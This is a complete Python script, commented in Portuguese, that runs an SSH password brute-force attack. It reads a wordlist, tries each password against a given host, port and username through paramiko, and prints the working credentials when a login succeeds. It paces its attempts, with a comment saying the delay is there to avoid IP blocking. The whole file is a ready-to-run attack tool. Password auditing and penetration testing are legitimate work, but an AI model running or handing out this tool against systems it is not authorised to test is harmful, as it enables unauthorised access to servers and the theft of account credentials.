#!/usr/bin/python3
# Programa para executar testes de força bruta no serviço SSH.
# Uso: python3 pyBRUTOS.py <IP> <PORTA> <USUARIO> <LISTA_DE_SENHAS>
# Exemplo: python pyBRUTOS.py 192.168.1.10 22 root senhas.txt
# Instalação da biblioteca Paramiko: pip3 install paramiko --break-system-packages


import argparse
import paramiko
import socket
import sys
import time

### FUNÇÃO PARA PEGAR OS PARAMETROS FORNECIDOS PELO USUÁRIO
def parse_args():
    parser = argparse.ArgumentParser(
        description="Brute force de credenciais SSH ."
    )
    parser.add_argument("host",       help="Endereço IP do alvo")
    parser.add_argument("port",       type=int, help="Porta SSH (padrão 22)")
    parser.add_argument("username",   help="Nome do usuário a testar")
    parser.add_argument("wordlist",   help="Caminho para o arquivo com as senhas")
    return parser.parse_args()

### FUNÇÃO PARA CARREGAR E VERIFICAR A LISTA DE SENHAS.
def carregar_senhas(caminho):
    try:
        with open(caminho, "r", encoding="utf-8") as f:
            return [linha.strip() for linha in f if linha.strip()]
    except FileNotFoundError:
        print(f"[-] Arquivo não encontrado: {caminho}")
        sys.exit(1)

### FUNÇÃO PARA CONECTAR NO IP E TESTAR AS CREDENCIAS
def tentar_ssh(host, porta, usuario, senha, timeout=5):
    client = paramiko.SSHClient()
    # Aceita automaticamente a chave do host (evita prompt interativo)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=host,
            port=porta,
            username=usuario,
            password=senha,
            timeout=timeout,
            allow_agent=False,    # Desativa o agente SSH local
            look_for_keys=False   # Não tenta chaves privadas
        )
        return True  # Conexão e autenticação OK

    except paramiko.AuthenticationException:
        return False  # Senha incorreta

    except (socket.timeout, socket.error):
        print(f"[-] Falha de rede ao conectar em {host}:{porta}")
        sys.exit(1)  # Encerra: o host não está acessível

    finally:
        client.close()  # Garante que o socket seja fechado

### FUNÇÃO PRINCIPAL DO PROGRAMA - VALIDA AS ENTRADAS, CRIA A CONEXÃO E TESTAR AS CREDENCIAS.
def main():
    args = parse_args()

    print(f"[*] Alvo: {args.host}:{args.port}")
    print(f"[*] Usuário: {args.username}")
    print(f"[*] Iniciando brute force...\n")

    senhas = carregar_senhas(args.wordlist)
    print(f"[*] {len(senhas)} senhas carregadas.\n")

    for i, senha in enumerate(senhas, 1):
        print(f"[{i}/{len(senhas)}] Tentando: {args.username}:{senha}", end=" ")

        if tentar_ssh(args.host, args.port, args.username, senha):
            print("\n[+] LOGIN BEM-SUCEDIDO!")
            print(f"    Usuário: {args.username}")
            print(f"    Senha:   {senha}")
            sys.exit(0)  # Encerra ao encontrar a senha correta
        else:
            print("falhou")

        time.sleep(0.5)  # Pausa de 0.5s entre tentativas (Para evitar bloqueio de IP)

    print("\n[-] Nenhuma senha da lista foi válida.")
    sys.exit(1)

### EXECUTA O PROGRAMA COMO SCRIPT OU MODULO.
if __name__ == "__main__":
    main()   